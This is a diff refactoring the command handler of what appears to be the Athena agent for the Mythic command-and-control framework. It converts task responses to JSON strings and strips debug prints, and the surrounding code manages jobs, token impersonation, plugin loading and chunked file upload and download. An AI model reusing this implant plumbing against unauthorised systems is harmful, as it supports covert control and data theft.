@@ -1,7 +1,3 @@
-
-﻿#if DEBUG
-    //#define WINBUILD
-#endif
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
@@ -42,14 +38,14 @@ namespace Athena.Commands
 #if WINBUILD
         private TokenHandler tokenHandler { get; }
 #endif
-        private ConcurrentBag<ResponseResult> responseResults { get; set; }
+        private ConcurrentBag<string> responseResults { get; set; }
         public CommandHandler()
         {
             this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
             this.assemblyHandler = new AssemblyHandler();
             this.downloadHandler = new DownloadHandler();
             this.uploadHandler = new UploadHandler();
-            this.responseResults = new ConcurrentBag<ResponseResult>();
+            this.responseResults = new ConcurrentBag<string>();
 
 #if WINBUILD
 
@@ -64,8 +60,6 @@ namespace Athena.Commands
         {
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true;
-            Console.WriteLine("Got Job: " + task.command);
-            Console.WriteLine("ID" + task.id);
 #if WINBUILD
             if(task.token != 0)
             {
@@ -110,7 +104,7 @@ namespace Athena.Commands
                             user_output = "Cancelled job",
                             completed = "true",
                             task_id = job.task.id,
-                        });
+                        }.ToJson());
                     }
                     else
                     {
@@ -120,7 +114,7 @@ namespace Athena.Commands
                             completed = "true",
                             task_id = job.task.id,
                             status = "error"
-                        });
+                        }.ToJson());
                     }
                     this.activeJobs.Remove(task.id, out _);
                     break;
@@ -169,7 +163,7 @@ namespace Athena.Commands
                         user_output = "Not implemented yet.",
                         completed = "true",
                         task_id = job.task.id,
-                    });
+                    }.ToJson());
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "E9B43EE9A9B0FDF6EF393DC0591C11DB": //set-profile
@@ -212,7 +206,7 @@ namespace Athena.Commands
                     
                     if(rr is not null)
                     {
-                        this.responseResults.Add(rr);
+                        this.responseResults.Add(rr.ToJson());
                         this.activeJobs.Remove(task.id, out _);
 
                     }
@@ -240,7 +234,7 @@ namespace Athena.Commands
         /// List avialable c2 profiles
         /// </summary>
         /// <param name="job">MythicJob to pass with the event</param>
-        private async Task<ResponseResult> ListProfiles(MythicJob job)
+        private async Task<string> ListProfiles(MythicJob job)
         {
             StringBuilder sb = new StringBuilder();
             var type = typeof(IProfile);
@@ -258,7 +252,7 @@ namespace Athena.Commands
                 task_id = job.task.id,
                 completed = "true",
                 user_output = sb.ToString()
-            };
+            }.ToJson();
 
         }
         /// <summary>
@@ -326,20 +320,32 @@ namespace Athena.Commands
         /// <summary>
         /// Provide a list of repsonses to the MythicClient
         /// </summary>
-        public async Task<List<ResponseResult>> GetResponses()
+        public async Task<List<string>> GetResponses()
         {
-            List<ResponseResult> responses = this.responseResults.ToList<ResponseResult>();
+            List<string> responses = this.responseResults.ToList<string>();
             this.responseResults.Clear();
 
             if (this.assemblyHandler.assemblyIsRunning)
             {
-                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
+                responses.Add((await this.assemblyHandler.GetAssemblyOutput()).ToJson());
             }
+            List<object> results = await PluginHandler.GetResponses();
 
-            responses.AddRange(await PluginHandler.GetResponses());
-
-            foreach(ResponseResult response in responses)
+            foreach(ResponseResult response in results)
             {
+                if (response is FileBrowserResponseResult fbresult)
+                {
+                    responses.Add(fbresult.ToJson());
+                }
+                else if (response is ProcessResponseResult presult)
+                {
+                    responses.Add(presult.ToJson());
+                }
+                else
+                {
+                    responses.Add(((ResponseResult)response).ToJson());
+                }
+
                 if (this.activeJobs.ContainsKey(response.task_id) && response.completed ==  "true")
                 {
                     this.activeJobs.Remove(response.task_id, out _);
@@ -351,7 +357,7 @@ namespace Athena.Commands
         /// Add a ResponseResult to the response list
         /// </summary>
         /// <param name="response">ResposneResult or inherited object containing the task results</param>
-        public async Task AddResponse(ResponseResult response)
+        public async Task AddResponse(string response)
         {
             this.responseResults.Add(response);
         }
@@ -359,17 +365,17 @@ namespace Athena.Commands
         /// Add multiple ResponseResult to the response list
         /// </summary>
         /// <param name="response">ResposneResult or inherited object containing the task results</param>
-        public async Task AddResponse(List<ResponseResult> responses)
+        public async Task AddResponse(List<string> responses)
         {
-            List<ResponseResult> tmpResponse = new List<ResponseResult>();
-            responses.ForEach(response => tmpResponse = this.responseResults.Prepend<ResponseResult>(response).ToList());
-            this.responseResults = new ConcurrentBag<ResponseResult>(tmpResponse);
+            List<string> tmpResponse = new List<string>();
+            responses.ForEach(response => tmpResponse = this.responseResults.Prepend<string>(response).ToList());
+            this.responseResults = new ConcurrentBag<string>(tmpResponse);
         }
         /// <summary>
         /// Get the currently running jobs
         /// </summary>
         /// <param name="task_id">Task ID of the mythic job to respond to</param>
-        private async Task<ResponseResult> GetJobs(string task_id)
+        private async Task<string> GetJobs(string task_id)
         {
             //List<object> jobs = new List<object>();
             List<JobStatus> jobsStatus = new List<JobStatus>();
@@ -383,7 +389,7 @@ namespace Athena.Commands
                 user_output = JsonSerializer.Serialize(jobsStatus, JobStatusContext.Default.ListJobStatus),
                 task_id = task_id,
                 completed = "true"
-            };
+            }.ToJson();
         }     
         /// <summary>
         /// Check if a plugin is already loaded and execute it
@@ -442,7 +448,7 @@ namespace Athena.Commands
                             chunk_size = uploadJob.chunk_size,
                             full_path = uploadJob.path
                         }
-                    });
+                    }.ToJson());
                 }
                 else
                 {
@@ -456,7 +462,7 @@ namespace Athena.Commands
                             chunk_size = uploadJob.chunk_size,
                             full_path = uploadJob.path
                         }
-                    });
+                    }.ToJson());
                 }
 
             }
@@ -469,7 +475,7 @@ namespace Athena.Commands
                     task_id = response.task_id,
                     user_output = "Mythic sent no data to upload!"
 
-                });
+                }.ToJson());
             }
         }
         /// <summary>
@@ -495,7 +501,7 @@ namespace Athena.Commands
                     status = "error",
                     user_output = "No file_id received",
                     completed = "true"
-                });
+                }.ToJson());
             }
             else
             {
@@ -520,7 +526,7 @@ namespace Athena.Commands
                             file_id = downloadJob.file_id,
                             chunk_num = downloadJob.chunk_num,
                             chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
-                        });
+                        }.ToJson());
                     }
                     else
                     {
@@ -538,7 +544,7 @@ namespace Athena.Commands
                             completed = "true",
                             total_chunks = -1
 
-                        });
+                        }.ToJson());
                     }
                 }
                 else
@@ -549,7 +555,7 @@ namespace Athena.Commands
                         file_id = downloadJob.file_id,
                         chunk_num = downloadJob.chunk_num,
                         chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
-                    });
+                    }.ToJson());
                 }
             }
         }
